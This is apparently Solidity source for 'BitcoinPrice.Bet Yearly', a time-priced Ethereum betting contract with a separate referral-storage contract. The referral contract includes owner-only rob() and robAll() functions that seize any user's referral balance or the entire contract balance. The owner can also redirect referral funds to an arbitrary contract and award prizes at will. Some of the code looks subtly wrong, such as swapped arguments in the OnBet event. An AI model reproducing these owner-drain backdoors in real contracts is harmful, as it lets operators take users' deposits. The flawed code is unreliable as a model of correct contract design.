pragma solidity ^0.4.25;

contract RefPaymentContract {
    function receivePayment() external payable;
}

contract RefStorage {
    event OnGotRef(address indexed user, uint256 amount, uint256 time, address indexed referrer);
    event OnWithdraw(address indexed user, uint256 amount, uint256 time);
    event OnRob(address indexed user, uint256 amount, uint256 time);
    event OnRobAll(uint256 amount, uint256 time);
    
    mapping(address => uint256) public userBalances;
    
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public {
        owner = msg.sender;
    }
    
    function addRef(address user, address referrer) public payable {
        require(msg.value > 0);
        userBalances[user] += msg.value;
        emit OnGotRef(user, msg.value, now, referrer);
    }
    
    function withdraw() public {
        require(userBalances[msg.sender] > 0);
        uint256 amount = userBalances[msg.sender];
        userBalances[msg.sender] = 0;
        msg.sender.transfer(amount);
        emit OnWithdraw(msg.sender, amount, now);
    }
    
    function rob(address user) onlyOwner public {
        require(userBalances[user] > 0);
        uint256 amount = userBalances[user];
        userBalances[user] = 0;
        owner.transfer(amount);
        emit OnRob(user, amount, now);
    }
    
    function robAll() onlyOwner public {
        uint256 balance = address(this).balance;
        owner.transfer(balance);
        emit OnRobAll(balance, now);
    }
}

contract MainContract {
    event OnBet(
        address indexed referrer,
        address indexed user,
        uint256 indexed blockNumber,
        uint256 amount,
        uint256 betValue,
        uint256 remainder,
        uint256 referralAmount,
        uint256 multiplier
    );
    event OnWithdraw(address indexed winner, uint256 amount);
    event OnWithdrawWin(address indexed winner, uint256 amount);
    event OnPrizePayed(
        address indexed winner,
        uint256 amount,
        uint8 prizeType,
        uint256 betValue,
        uint256 multiplier,
        uint256 timestamp
    );
    event OnNTSCharged(uint256 amount);
    event OnYJPCharged(uint256 amount);
    event OnGotMoney(address indexed sender, uint256 amount);
    event OnCorrect(uint256 amount);
    event OnPrizeFunded(uint256 amount);
    event OnSendRef(
        address indexed user,
        uint256 amount,
        uint256 time,
        address indexed referrer,
        address indexed refContract
    );
    event OnNewRefPayStation(address newRefContract, uint256 time);
    event OnBossPayed(address indexed boss, uint256 amount, uint256 time);
    
    RefPaymentContract constant internal paymentContract = RefPaymentContract(0xad0a61589f3559026F00888027beAc31A5Ac4625);
    RefStorage public refStorage = RefStorage(0x4100dAdA0D80931008a5f7F5711FFEb60A8071BA);
    
    mapping(address => uint256) public winnerBalances;
    
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public payable {
        owner = msg.sender;
        contractState.prizePool = msg.value;
    }
    
    function() public payable {
        emit OnGotMoney(msg.sender, msg.value);
    }
    
    function getTicketPrice() public view returns (uint256) {
        if (now >= 1545581345 && now < 1548979200) return 0.1 ether;
        if (now >= 1548979200 && now < 1551398400) return 0.2 ether;
        if (now >= 1551398400 && now < 1554076800) return 0.3 ether;
        if (now >= 1554076800 && now < 1556668800) return 0.4 ether;
        if (now >= 1556668800 && now < 1559347200) return 0.5 ether;
        if (now >= 1559347200 && now < 1561939200) return 0.6 ether;
        if (now >= 1561939200 && now < 1564617600) return 0.7 ether;
        if (now >= 1564617600 && now < 1567296000) return 0.8 ether;
        return 0;
    }
    
    function isActive() public view returns (bool) {
        return getTicketPrice() > 0;
    }
    
    function placeBet(uint256 betValue, address referrer) public payable {
        uint256 ticketPrice = getTicketPrice();
        require(ticketPrice > 0);
        
        uint256 amount = (msg.value / ticketPrice) * ticketPrice;
        uint256 remainder = msg.value - amount;
        
        require(amount > 0);
        
        contractState.prizePool += remainder;
        
        uint8 totalFeePercent = contractState.ownerFeePercent + contractState.devFeePercent;
        uint256 referralAmount = 0;
        
        if (referrer != address(0)) {
            totalFeePercent += contractState.referralPercent;
            referralAmount = amount * contractState.referralPercent / 100;
            refStorage.addRef.value(referralAmount)(referrer, msg.sender);
            emit OnSendRef(referrer, referralAmount, now, msg.sender, address(refStorage));
        }
        
        uint256 netAmount = amount - amount * totalFeePercent / 100;
        contractState.prizePool += netAmount;
        
        contractState.ownerFund += amount * contractState.ownerFeePercent / 100;
        contractState.devFund += amount * contractState.devFeePercent / 100;
        
        emit OnBet(msg.sender, referrer, block.number, amount, betValue, remainder, referralAmount, amount / ticketPrice);
    }
    
    function withdrawWin() public {
        require(winnerBalances[msg.sender] > 0);
        uint256 amount = winnerBalances[msg.sender];
        winnerBalances[msg.sender] = 0;
        contractState.prizeReserve -= amount;
        msg.sender.transfer(amount);
        emit OnWithdrawWin(msg.sender, amount);
    }
    
    function payPrize(
        address winner,
        uint256 amount,
        uint8 prizeType,
        uint256 betValue,
        uint256 multiplier,
        uint256 timestamp
    ) onlyOwner public {
        require(amount <= contractState.prizePool);
        winnerBalances[winner] += amount;
        contractState.prizeReserve += amount;
        contractState.prizePool -= amount;
        emit OnPrizePayed(winner, amount, prizeType, betValue, multiplier, timestamp);
    }
    
    function sendRef(
        address user,
        address referrer,
        uint256 amount
    ) onlyOwner public {
        require(amount <= contractState.prizePool);
        contractState.prizePool -= amount;
        refStorage.addRef.value(amount)(user, referrer);
        emit OnSendRef(user, amount, now, referrer, address(refStorage));
    }
    
    function withdrawOwnerFund(uint256 amount) onlyOwner public {
        require(amount <= contractState.ownerFund);
        if (amount == 0) amount = contractState.ownerFund;
        
        uint256 amountToBoss1 = amount * 90 / 100;
        uint256 amountToBoss2 = amount * 10 / 100;
        
        if (contractState.boss1.send(amountToBoss1)) {
            contractState.ownerFund -= amountToBoss1;
            emit OnBossPayed(contractState.boss1, amountToBoss1, now);
        }
        
        if (contractState.boss2.send(amountToBoss2)) {
            contractState.ownerFund -= amountToBoss2;
            emit OnBossPayed(contractState.boss2, amountToBoss2, now);
        }
    }
    
    function chargeDevFund() onlyOwner public {
        require(contractState.devFund > 0);
        uint256 amount = contractState.devFund;
        paymentContract.receivePayment.value(contractState.devFund)();
        contractState.devFund = 0;
        emit OnNTSCharged(amount);
    }
    
    function correctOwnerFund() onlyOwner public {
        uint256 accountedBalance = contractState.prizeReserve + 
                                  contractState.ownerFund + 
                                  contractState.devFund + 
                                  contractState.prizePool;
        uint256 actualBalance = address(this).balance - accountedBalance;
        require(actualBalance > 0);
        contractState.ownerFund += actualBalance;
        emit OnCorrect(actualBalance);
    }
    
    function fundPrizePool() onlyOwner public {
        uint256 accountedBalance = contractState.prizeReserve + 
                                  contractState.ownerFund + 
                                  contractState.devFund + 
                                  contractState.prizePool;
        uint256 actualBalance = address(this).balance - accountedBalance;
        require(actualBalance > 0);
        contractState.prizePool += actualBalance;
        emit OnPrizeFunded(actualBalance);
    }
    
    function setRefStorage(address newRefStorage) onlyOwner public {
        refStorage = RefStorage(newRefStorage);
        emit OnNewRefPayStation(newRefStorage, now);
    }
    
    struct ContractState {
        uint256 prizePool;
        uint256 devFund;
        uint256 ownerFund;
        uint256 prizeReserve;
        uint8 devFeePercent;
        uint8 referralPercent;
        uint8 ownerFeePercent;
        address boss1;
        address boss2;
        address owner;
        string symbol;
        string name;
        address contractOwner;
    }
    
    ContractState contractState = ContractState(
        0,
        0,
        0,
        0,
        5,
        8,
        10,
        0x8D86E611ef0c054FdF04E1c744A8cEFc37F00F81,
        0x42cF5e102dECCf8d89E525151c5D5bbEAc54200d,
        address(0),
        "BPBY",
        "BitcoinPrice.Bet Yearly",
        address(0)
    );
}